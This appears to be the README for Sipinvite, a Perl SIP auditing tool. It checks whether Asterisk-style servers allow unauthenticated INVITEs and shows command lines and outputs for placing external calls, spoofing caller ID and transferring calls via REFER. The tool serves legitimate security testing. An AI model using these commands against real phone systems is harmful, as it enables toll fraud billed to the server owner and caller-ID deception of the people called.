Sipinvite checks if a server allow us to make calls without authentication. If the SIP server has a bad configuration, it will allows us to make calls to external numbers. Also it can allow us to transfer the call to a second external number.

For example, if your Asterisk server has a bad context configuration, you can accept INVITE request with no authorization required. On this case an attacker can make calls without know no user/pass.

# Features #
Sipinvite allows us to:
  * Test remotely if a SIP server require authentication to make calls.
  * Make calls without auth if the server has a bad configuration.
  * Transfer established calls to a second number (1).
  * Alter the Callerid if the server allows it.
  * Analyze responses using verbose mode.

(1) If you can send an INVITE through a bad configured server and the call sound on the target number, it is possible to send a second message (a REFER on this case) to transfer the call to another number:

```
SipINVITE                     SIP Server                      Phone1              Phone2
         ---> INVITE      ---> 
                                        ---> INVITE      --->
                                        <--- 100 Trying  <---
         <--- 100 Trying  <---
                                        <--- 180 Ringing <---
         <--- 180 Ringing <---
                                        <--- 200 Ok      <---
         <--- 200 Ok      <---
         ---> ACK         ---> 
         <--- 200 Ok      <---
         ---> REFER       ---> 
                                        --->           INVITE                --->
         <--- 202 Accept  <---
                                                              <--->  RTP Session <--->
```

# Usage #
```
$ perl sipinvite.pl 

SipINVITE - by Pepelux <pepeluxx@gmail.com>
---------

Usage: perl sipinvite.pl -h <host> -d <dst_number> [options]
 
== Options ==
-d  <integer>    = Destination number
-u  <string>     = Username to authenticate
-p  <string>     = Password to authenticate
-s  <integer>    = Source number (CallerID) (default: 100)
-r  <integer>    = Remote port (default: 5060)
-t  <integer>    = Transfer call to another number
-ip <string>     = Source IP (by default it is the same as host)
-v               = Verbose (trace information)
```

  * Trying to make a call to exten 100 (without auth)
```
$perl sipinvite.pl -h 192.168.0.1 -d 100
```
  * Trying to make a call to exten 100 (with auth)
```
$perl sipinvite.pl -h 192.168.0.1 -u sipuser -p supersecret -d 100 -r 5080
```
  * Trying to make a call to number 555555555 (without auth) with source number 200
```
$perl sipinvite.pl -h 192.168.0.1 -s 200 -d 555555555 -v
```
  * Trying to make a call to number 555555555 (without auth) and tranfer it to number 666666666
```
$perl sipinvite.pl -h 192.168.0.1 -d 555555555 -t 666666666
```
  * Trying to make a call to number 555555555 (without auth) using callerid 123456789 and tranfer it to number 666666666
```
$perl sipinvite.pl -h 192.168.0.1 -d 555555555 -t 666666666 -s 123456789
```

# Examples #
  * Asterisk server with a context well configured but that allows to make calls without user authentication:
```
$ perl sipinvite.pl -h 192.168.0.55 -d 0034666666666
[+] Sending INVITE 100 => 0034666666666
[-] 404 Not Found
```

On the Asterisk console you can see something similar to:
```
NOTICE[1034]: chan_sip.c:22753 handle_request_invite: Call from '' (X.X.X.X:5070) to extension '0034666666666' rejected because extension not found in context 'default'.
```

  * Asterisk server with a context bad configured and that also allows to make calls without user authentication:
```
$ perl sipinvite.pl -h 192.168.0.55 -d 0034666666666
[+] Sending INVITE 100 => 0034666666666
[-] 100 Trying
[-] 183 Session Progress
[-] 200 OK
```

On the Asterisk console you can see something similar to:
```
  == Using SIP RTP CoS mark 5
    -- Executing [0034666666666@default:1] Dial("SIP/192.160.0.55-00000001", "SIP/trunk/0034666666666,30") in new stack
  == Using SIP RTP CoS mark 5
    -- Called SIP/trunk/0034666666666
```

Trying a transfer in the same vulnerable server:
```
$ perl sipinvite.pl -h 192.168.0.55 -d 0034666666666 -t 0034777777777
[+] Sending INVITE 100 => 0034666666666
[-] 100 Trying
[-] 183 Session Progress
[-] 200 OK
[+] Sending ACK
[+] Sending REFER 100 => 0034777777777
[-] 202 Accepted
```

On the Asterisk console you can see something similar to:
```
  == Using SIP RTP CoS mark 5
    -- Executing [0034666666666@default:1] Dial("SIP/192.168.0.55-00000000", "SIP/trunk/0034666666666,30") in new stack
  == Using SIP RTP CoS mark 5
    -- Called SIP/trunk/0034666666666
    -- SIP/trunk-00000001 is making progress passing it to SIP/192.168.0.55-00000000
    -- SIP/trunk-00000001 answered SIP/192.168.0.55-00000000
    -- Remotely bridging SIP/192.168.0.55-00000000 and SIP/trunk-00000001
    -- Executing [0034777777777@default:1] Dial("SIP/trunk-00000001", "SIP/trunk/0034777777777,30") in new stack
  == Using SIP RTP CoS mark 5
    -- Called SIP/trunk/0034777777777
```
